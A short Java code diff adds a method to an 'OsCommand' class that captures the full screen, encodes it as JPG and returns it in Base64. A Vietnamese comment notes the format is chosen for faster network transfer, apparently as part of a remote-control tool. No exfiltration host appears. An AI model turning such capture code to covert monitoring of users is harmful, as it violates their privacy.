@@ -2,6 +2,13 @@ package com.ly.system;
 
 import java.net.InetAddress;
 import java.net.URI;
+ import java.awt.Rectangle;
+ import java.awt.Robot;
+ import java.awt.Toolkit;
+ import java.awt.image.BufferedImage;
+ import java.io.ByteArrayOutputStream;
+ import java.util.Base64;
+ import javax.imageio.ImageIO;
 
 public class OsCommand {
 
@@ -68,6 +75,22 @@ public class OsCommand {
 
         } catch (Exception e) {
             System.out.println("⚠️ Lỗi mở mạng: " + e.getMessage());
+        }
+    }
+    public static String captureScreenBase64() {
+        try {
+            Robot robot = new Robot();
+            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+            BufferedImage screenImage = robot.createScreenCapture(screenRect);
+
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            // Dùng định dạng JPG để dung lượng ảnh nhẹ, truyền qua mạng nhanh hơn
+            ImageIO.write(screenImage, "jpg", baos);
+
+            byte[] imageBytes = baos.toByteArray();
+            return Base64.getEncoder().encodeToString(imageBytes);
+        } catch (Exception e) {
+            return "ERROR";
         }
     }
 }
